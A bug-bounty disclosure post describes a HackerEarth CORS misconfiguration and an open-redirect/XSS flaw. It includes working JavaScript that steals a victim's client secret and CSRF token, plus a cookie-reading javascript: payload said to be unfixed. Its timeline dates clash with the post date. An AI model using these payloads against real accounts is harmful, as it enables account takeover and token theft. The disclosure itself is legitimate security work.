---
title:      Stealing secrets tokens and all private info of victim hackerearth account 
date:       2020-07-10 11:31:19
author:     dr3dd
summary:    Stealing secrets tokens of hackerearth account 
categories: Bug-Bounty
thumbnail:  book
password:  h4k3re4rth_h4ck
tags:
 - Bug-Bounty
---

Hi all,

I found two bugs in hackerearth. one of them is fixed and other is still not fixed.

### 1. cores misconfiguration (fixed)

When i change the origin header in request to `https://www.hackerearth.com.evil.com` the responce i got is:

```python
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hackerearth.com.evil.com
```

I backend regex onlly check for `www.hackerearth.com` after `https://`. So i made a subdomain of my site `www.hackerearth.com.dr3dd.live` after passing this domain
in request i got the response is:

```python
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hackerearth.com.dr3dd.live
```

We can see `Access-Control-Allow-Credentials: true` for `www.hackerearth.com.dr3dd.live`. So i wrote a small js script to steal secrets tokens of victim.

```html
<!DOCTYPE html>
<html>
<body>

<div>
<h1>Getting hackerearth Client secrets for victim!!!</h1>
<button type="button" onclick="loadDoc()">Get secrets!!!</button>
  <div id="demo1"></div>
  <div id="demo2"></div>
  <div id="demo3"></div>
<button type="button" onclick="get_csrf_token()">You can get any csrf token and make changes in victim account like this is account deactivate csrf token!!!</button>
  <div id="demo4"></div>
</div>

<script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var parser=new DOMParser();
        var xmlDoc=parser.parseFromString(this.responseText, "text/html").documentElement;
        var clientId = xmlDoc.querySelector('#client-id');
        var clientSecret = xmlDoc.querySelector('#client-secret');
        var username = xmlDoc.querySelector('#change-username');
        document.getElementById("demo1").innerHTML = clientId.innerText;
        document.getElementById("demo2").innerHTML = clientSecret.innerText;
        document.getElementById("demo3").innerHTML = username.innerText.replace('Edit','');;
        
    }
  };
  xhttp.open("GET", "https://www.hackerearth.com/users/profile-settings/", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
function get_csrf_token(){
  var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var parser=new DOMParser();
        var xmlDoc= parser.parseFromString(this.responseText, "text/html").documentElement;
        var csrf = xmlDoc.querySelector('#deactivate-form')[0].value;
      document.getElementById("demo4").innerHTML = "csrf for deactivate account : " + csrf;
    }
  };
  var username = document.getElementById("demo3").innerText;
  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","");;
  xhttp.open("GET", url, true);
  xhttp.withCredentials = true;
  xhttp.send();
}
  
  
</script>

</body>
</html>
```

I have hosted it on `http://www.hackerearth.com.dr3dd.live/cores.html` first button steal secrets token and second one steal csrf tokens of victim.


### 2. XSS + Open Redirect (not fixed)

This one is pretty simple bug. for open redirect go to :

`https://www.hackerearth.com/social-login-complete-page/?redirect=https://evil.com`

to access cookie we can use :

`https://www.hackerearth.com/social-login-complete-page/?redirect=javascript:alert(document.cookie)`


Here is video POC link of both bugs :

[POC Drive Link](https://drive.google.com/drive/folders/1TrOvBYbtEp0gDGq2A7npSNd8_5ok8ccn?usp=sharing)


### Timeline

1. `March-16-2020`  Submit report to hackerearth via mail
2. `March-18-2020`  Submit Detail POC for bugs
3. `March-27-2020`  1st bug Core misconfiguration is fixed but there is no response from the security team.
4. `April-18-2020`  Asked for update but they said they still working on fix.
5. `Aug-09-2020`    Asked for update but they said they still working on fix.
6. `Aug-24-2020`    Asked for update but they said they still working on fix.
7. `Present`        Still not responding.